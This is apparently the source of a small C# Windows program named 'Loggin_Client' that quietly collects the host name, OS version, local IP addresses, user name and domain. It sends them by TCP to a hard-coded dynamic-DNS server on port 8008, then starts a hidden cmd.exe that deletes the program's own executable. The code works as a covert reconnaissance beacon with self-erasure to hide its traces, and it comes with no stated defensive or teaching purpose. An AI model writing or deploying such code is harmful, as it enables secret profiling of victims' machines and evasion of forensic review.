using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;

/// Start from command with an argument as the server destination and second argument as port number

namespace Loggin_Client
{
    class Program
    {
        //DONE Disable clean up some how? (Nope)
        //static bool cleanup = true;
        static void Main(string[] args)
        {
            int serverPort = 8008;
            string server = "jazyserver.myftp.org";
            //string server  = "192.168.0.100";

            if (args.Length > 0)
            {
                try
                {
                    server = args[0];
                    int tmp = int.Parse(args[1]);
                    serverPort = tmp;
                }
                catch (Exception e)
                {
                    System.Diagnostics.Debug.WriteLine(e.ToString());
                }
            }

            string pchostname = System.Environment.MachineName;
            string username = System.Environment.UserName;
            string userdomain = System.Environment.UserDomainName;
            string os = System.Environment.OSVersion.ToString();
            IPAddress[] localipaddress = Dns.GetHostAddresses(Dns.GetHostName());//.Where(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);

            try
            {
                using (TcpClient sender = new TcpClient(server, serverPort))
                {
                    NetworkStream stream = sender.GetStream();
                    string msg = pchostname + "(" + os + ")" + " at ";
                    foreach (IPAddress ip in localipaddress)
                    {
                        if (ip.AddressFamily == AddressFamily.InterNetwork)
                        {
                            msg += ip.ToString() + " and ";
                        }
                    }
                    msg = msg.Substring(0,msg.LastIndexOf(" and"));
                    msg += "\n" + "Current user:" + username + "@" + userdomain + "\n";
                    byte[] data = Encoding.ASCII.GetBytes(msg);
                    stream.Write(data, 0, data.Length);
                    stream.Flush();
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine(e.ToString());
            }

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.Arguments = "/C timeout 1 & del /f /q \"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.FileName = "cmd.exe";
            Process.Start(psi);
        }
    }
}
